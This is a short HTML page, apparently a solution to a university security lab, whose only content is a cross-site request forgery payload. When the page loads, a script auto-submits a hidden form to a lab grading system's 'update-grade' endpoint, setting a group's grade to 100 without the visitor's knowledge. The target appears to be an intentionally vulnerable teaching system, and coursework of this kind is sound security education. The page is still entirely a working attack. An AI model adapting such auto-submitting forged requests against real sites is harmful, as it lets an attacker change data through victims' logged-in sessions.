<!DOCTYPE html>
<html>
<body>
    <form id="f" action="https://cse484.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade" method="post">
            <input name="groups" value="tjsl">
            <input name="grade"  value="100">
    </form>
    <script>
        window.onload = function() {
            document.getElementById('f').submit();
        };
    </script>
</body>
</html>
